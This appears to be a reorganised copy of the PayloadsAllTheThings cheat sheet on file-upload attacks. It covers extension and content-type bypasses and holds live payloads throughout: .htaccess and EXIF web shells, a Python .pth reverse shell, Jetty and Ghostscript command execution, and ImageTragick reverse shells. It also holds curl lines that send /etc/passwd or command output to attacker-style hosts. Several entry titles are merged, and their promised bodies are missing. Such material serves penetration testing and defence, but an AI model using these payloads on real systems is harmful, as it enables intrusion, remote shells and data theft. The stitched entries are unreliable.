meta.caption: Decision tree for testing an upload form: what to check on the client and server side (extension, content-type, magic bytes, file processing after upload). Source: PayloadsAllTheThings.

entries.title: Nature of the vulnerability and where to look
entries.body:
Uploaded files are dangerous if handled incorrectly. The attacker sends a multipart/form-data POST with a specially crafted filename or MIME type and achieves code execution.

Two different attack surfaces:
• The mere fact of uploading an executable file (web shell) -> RCE.
• How the file is processed AFTER upload (filename, resize, conversion, extraction) -> SQLi/XSS/LFI/XXE/RCE.

Check order: extension -> content-type -> magic bytes -> content (polyglots, images with code) -> filename -> post-processing (ImageMagick/ffmpeg/zip).

entries.title: Dangerous extensions by technology
entries.body: php asp jsp perl coldfusion nodejs

entries.title: Extensions for adjacent vulnerabilities
entries.body: svg gif csv xml avi js zip html

entries.title: Double and reverse double extension
entries.body:
Double extension:
.jpg.php
.png.php5

Reverse double extension (for broken Apache configs where anything with .php in the name is executed, even when not at the end):
.php.jpg

entries.title: Case switching
entries.body:
.pHp
.pHP5
.PhAr

entries.title: Null-byte (works against pathinfo())
entries.body:
.php%00.gif
.php\x00.gif
.php%00.png
.php\x00.png
.php%00.jpg
.php\x00.jpg

entries.title: Special characters: dots, spaces, newlines
entries.body:
Several dots at the end: file.php......   (Windows trims trailing dots on creation).

Space and newlines:
file.php%20
file.php%0d%0a.jpg
file.php%0a

Right-to-Left Override (RTLO): name.%E2%80%AEphp.jpg is displayed as name.gpj.php

Slashes:
file.php/
file.php.\
file.j\sp
file.j/sp
Several special characters: file.jsp/././././.

UTF8 in the name: Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt

entries.title: Windows specifics: trimming the tail of the name
entries.body:
On Windows, include / require / require_once will return "foo.php" if it is followed by these characters:
\x20 ( )  \x22 (")  \x2E (.)  \x3C (<)  \x3E (>)

fopen and move_uploaded_file will return "foo.php" if followed by:
\x2E (.)  \x2F (/)  \x5C (\)

With PHP on IIS, some characters are converted when saving (you can overwrite web.config via web<<):
\x3E (>) -> \x3F (?)
\x3C (<) -> \x2A (*)
\x22 (") -> \x2E (.)   - in the request, the Content-Disposition header must use single quotes, e.g. filename='web"config'

entries.title: NTFS Alternate Data Stream (ADS)
entries.body:
A colon ":" is inserted after the forbidden extension and before the allowed one. On the server an empty file is created with the forbidden extension (e.g. file.asax:.jpg), which can then be edited via short filename.

The ::$DATA pattern lets you create non-empty files; a dot after it bypasses additional filters:
file.asp::$data.

entries.title: Spoofing Content-Type to image/*
entries.body:
Change the Content-Type of the forbidden file (application/x-php, application/octet-stream) to an allowed image one:

Content-Type: image/gif
Content-Type: image/png
Content-Type: image/jpeg

Techniques: specify Content-Type twice (one forbidden, one allowed); check which of them the server actually uses.

entries.title: Dangerous PHP content-types (if the filter uses a whitelist)
entries.body:
text/php
text/x-php
application/php
application/x-php
application/x-httpd-php
application/x-httpd-php-source

entries.title: File signatures for spoofing
entries.body: png jpg gif magic bytes signature

entries.title: How it works
entries.body: Sometimes the server determines the file type by the first signature bytes. By adding/replacing them at the start of the file, you can fool the check - for example, prepend GIF8; before the PHP code so the file passes as a GIF but is interpreted as PHP.

entries.title: Classic phpinfo one-liner
entries.body: <?php phpinfo(); ?>

entries.title: Tiny shell via the short tag <?=
Shell without the <?php tag (via <script language="php">)
entries.body: <script language="php">system("id");</script>

entries.title: AddType - make Apache execute any extension as PHP
entries.body:
Upload an .htaccess with the AddType directive, then any file with the .rce extension:

AddType application/x-httpd-php .rce

Syntax: AddType mime-type extension [extension ...]
Important: .htaccess only affects its own folder and subfolders.

entries.title: Self-contained .htaccess web shell (htshell)
entries.body:
# Self contained .htaccess web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com

# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######

entries.title: Polyglot .htaccess/image (exif_imagetype bypass)
entries.body:
If the server checks the image type via exif_imagetype, make a .htaccess/image polyglot. In .htaccess, lines starting with \x00 and # are ignored - so the XBM and WBMP formats are suitable.

Generating .htaccess/xbm:
width = 50
height = 50
payload = '# .htaccess file'

with open('.htaccess', 'w') as htaccess:
    htaccess.write('#define test_width %d\n' % (width, ))
    htaccess.write('#define test_height %d\n' % (height, ))
    htaccess.write(payload)

entries.title: Polyglot .htaccess/wbmp
entries.body:
type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'# .htaccess file'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)

entries.title: web.config with an ASP shell (IIS)
uwsgi.ini - RCE via the @(exec://) operator
entries.body:
uWSGI .ini supports "magic" variables. The @(...) operator includes content; the exec:// scheme reads the process stdout. It executes when the config is parsed (restart, crash, autoreload).

[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[ATTACKER.DOMAIN.TLD])
; read from http
test = @(http://[ATTACKER.DOMAIN.TLD])
; read from a file descriptor
content = @(fd://[ATTACKER.DOMAIN.TLD])
; read from a process stdout
body = @(exec://whoami)
; call a function returning a char *
characters = @(call://uwsgi_func)

entries.title: Python .pth - code execution on interpreter startup
entries.body:
If you place a .pth in site-packages / dist-packages, the site module processes it on every Python startup. A line with import will run on any launch of the interpreter in that environment.

Find the paths via: python3 -m site
Typical ones: /usr/lib/pythonX.Y/site-packages/, /usr/local/lib/pythonX.Y/dist-packages/

Example reverse shell (one line in .pth):
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

entries.title: Dependency managers: package.json / composer.json
Jetty RCE - uploading an XML context
entries.body:
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/bin/sh</Item>
                    <Item>-c</Item>
                    <Item>curl -F "r=`id`" http://yourServer:1337/</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>

entries.title: SSI - command execution and file inclusion
entries.body:
Upload an .shtml / .stm with SSI directives (if SSI is enabled on the server):

Execute a command (exec.shtml):
<!--#exec cmd="whoami" -->

Include a file (include.shtml):
<!--#include file="..\..\web.config" -->

entries.title: SVG -> file read via ImageMagick (text:)
entries.body:
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="text:/etc/passwd" height="500" width="500"/>
</svg>

entries.title: SVG -> file read as HTML (html:)
entries.body:
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="html:/etc/passwd" height="500" width="500"/>
</svg>

entries.title: HTML file with XSS
entries.body:
Upload an .html to trigger XSS when it is opened:
<script>alert('XSS')</script>

entries.title: Payloads directly in the filename
entries.body: Sometimes it is not the upload itself that is vulnerable, but the later processing of the filename. Put the payload in the filename: Time-Based SQLi: poc.js'(select*from(select(sleep(20)))a)+'.extension LFI / Path Traversal: image.png../../../../../../../etc/passwd XSS: '">.extension File Traversal: ../../../tmp/lol.png Command Injection: ; sleep 10;

entries.title: EICAR - checking for the presence of an antivirus
entries.body:
Upload the EICAR file to find out whether an antivirus is running on the server (if the file is stripped/blocked, AV is present):

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*

entries.title: Idea: valid image with PHP code + LFI
entries.body:
Create a valid image storing PHP code, upload it, and execute the code via Local File Inclusion.
Shell invocation: curl 'http://localhost/test.php?0=system' --data "1='ls'"

Two ways to hide the code:
• Picture Metadata - payload in the EXIF comment.
• Picture Resize - payload inside the compression so it survives the resize and bypasses getimagesize() / imagecreatefromgif().

entries.title: EXIF comment with PHP (exiftool)
entries.body:
Create an image and insert PHP into the EXIF Comment tag:

convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

entries.title: PNG with a PLTE chunk surviving imagepng() (PHP-GD)
entries.body:
<?php 
//createPNGwithPLTE.php
// bypass imageCreateFromPng and imagepng 
$_payload="<?php phpinfo()?> ";
$_pay_len=strlen($_payload);
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !"; exit();
}


$width=$_pay_len/3;
$height=20;
//$im = imageCreateFromPng("existing.png");
$im = imagecreate($width, $height);

$_hex=unpack('H*',$_payload);
$_chunks=str_split($_hex[1], 6);

for($i=0; $i < count($_chunks); $i++){

  $_color_chunks=str_split($_chunks[$i], 2);
  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));

  imagesetpixel($im,$i,1,$color);

}

imagepng($im,"example.png");

entries.title: GIF with a Global Color Table surviving imagegif()
entries.body:
<?php
// createGIFwithGlobalColorTable.php
$_file="example.gif";
$_payload="<?php evil();?>";
$_width=200;
$_height=200;
if(strlen($_payload)%3!=0){
 echo "payload%3==0 !"; exit();
}
$im = imagecreate($_width, $_height);
$_hex=unpack('H*',$_payload);

$colors_hex=str_split($_hex[1], 6);

for($i=0; $i < count($colors_hex); $i++){
  $_color_chunks=str_split($colors_hex[$i], 2);
  $color=imagecolorallocate($im,hexdec($_color_chunks[0]),hexdec($_color_chunks[1]),hexdec($_color_chunks[2]));
  imagesetpixel($im,$i,1,$color);
}

imagegif($im,$_file);
?>

entries.title: PNG with a shell in metadata (Pillow)
entries.body:
from __future__ import print_function
from PIL import Image

# Shellcodes - Bypass included : Keyword Recognition : System, GET, php
# --- How to use : http://localhost/shell.php?c=echo%20'<pre>';ls

#shellcode  = "<?=@`$_GET[c]`;"
shellcode = "<?php system($_GET['c']); ?>"
# --- How to use : http://localhost/shell.php?_=system&__=echo%20'<pre>';ls
shellcode2 = "<?='Sh3ll'; $_='{';$_=($_^'<').($_^'>;').($_^'/');?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>"

im = Image.new("RGB", (10,10), "Black")
im.info["shell"] = shellcode
reserved = ('interlace', 'gamma', 'dpi', 'transparency', 'aspect')

from PIL import PngImagePlugin
meta = PngImagePlugin.PngInfo()

for k,v in im.info.items():
	if k in reserved: continue
	meta.add_text(k, v, 0)
im.save("payload.png", "PNG", pnginfo=meta)

entries.title: CVE-2016-3714 - nature and trigger
entries.body:
If the backend uses ImageMagick to resize/convert images, you can exploit ImageTragick (ImageMagick 7.0.1-1). Upload a payload with an image extension.
Triggered by the command: convert shellexec.jpeg whatever.gif

entries.title: ImageTragick #1 - reverse shell via fill url()
entries.body:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context

entries.title: ImageTragick #1 - bind shell via netcat
entries.body:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|nc -l -p 7777 -e"/bin/sh)'
pop graphic-context

entries.title: ImageTragick #1 - reverse shell via image over /dev/tcp
entries.body:
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/ip/80 0<&1 2>&1'
pop graphic-context
pop graphic-context

entries.title: ImageTragick #1 - exfil /etc/passwd to Burp Collaborator
entries.body: push graphic-context viewbox 0 0 200 200 fill 'url(https://example.123 "|curl -d "@/etc/passwd" -X POST https://xxx.burpcollaborator.net/test1 ")' pop graphic-context

entries.title: ImageTragick #1 - wget via image over
entries.body:
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 127.0.0.1:1337 > /dev/null`'
pop graphic-context

entries.title: ImageTragick #1 - SVG/XML reverse shell (nc.traditional)
entries.body:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink=
"http://www.w3.org/1999/xlink">
<image xlink:href="https://example.com/image.jpg"|/bin/nc.traditional 127.0.0.1 4242 -e /bin/bash""
x="0" y="0" height="640px" width="480px"/>
</svg>

entries.title: ImageTragick #3 - Ghostscript: execute id
entries.body:
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops

entries.title: Ghostscript - reverse shell via bash /dev/tcp
entries.body:
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/127.0.0.1/8080 0>&1') currentdevice putdeviceprops

entries.title: Ghostscript - callback via curl
entries.body:
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl http://attacker.com/?a=callback) currentdevice putdeviceprops

entries.title: CVE-2022-44268 - file read via PNG (info disclosure)
entries.body:
Information disclosure in ImageMagick: create a PNG whose processing leaks the contents of a server file.

# Generating the payload
apt-get install pngcrush imagemagick exiftool exiv2 -y
pngcrush -text a "profile" "/etc/passwd" exploit.png

# Trigger: the backend does something like convert pngout.png pngconverted.png
# Download the result and inspect: identify -verbose pngconverted.png
# Decode the leaked data:
python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'

entries.title: FFmpeg HLS CVE - file read via AVI with an HLS playlist
entries.body:
When processing video, FFmpeg can be made to read arbitrary files via a malicious HLS playlist inside an AVI (GAB2).

1. ./gen_xbin_avi.py file://<filename> file_read.avi
2. Upload file_read.avi to a site that processes video
3. On the server it runs: ffmpeg -i file_read.avi output.mp4
4. Click "Play" in the video service
5. If you are lucky, you will see the contents of <filename> from the server

Generated playlist:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST

entries.title: ZIP with a symlink to /etc/passwd
entries.body:
If the server extracts a ZIP and serves its contents, pack a symlink to /etc/passwd. After extraction, reading the "file" returns the target system file.

ln -s /etc/passwd link
zip --symlinks test.zip link

entries.title: Tools for testing uploads
entries.body:
• Fuxploider - scanner and exploitation for file upload vulnerabilities (github.com/almandin/fuxploider).
• Burp Upload Scanner - a BApp for testing uploads via Burp Proxy.
• ZAP FileUpload - an OWASP ZAP add-on for finding vulnerabilities in upload forms.
